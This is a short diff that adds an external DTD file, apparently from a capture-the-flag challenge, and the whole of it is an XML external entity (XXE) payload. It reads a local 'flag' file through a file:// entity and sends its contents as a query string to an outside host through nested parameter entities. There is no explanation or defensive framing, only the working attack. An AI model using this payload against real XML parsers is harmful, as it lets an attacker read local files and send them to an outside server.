@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag_b74f64f19db36b81eabf4def158584f8">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://www.minqz2009.com/?%file;'>">
+%eval;
+%error;
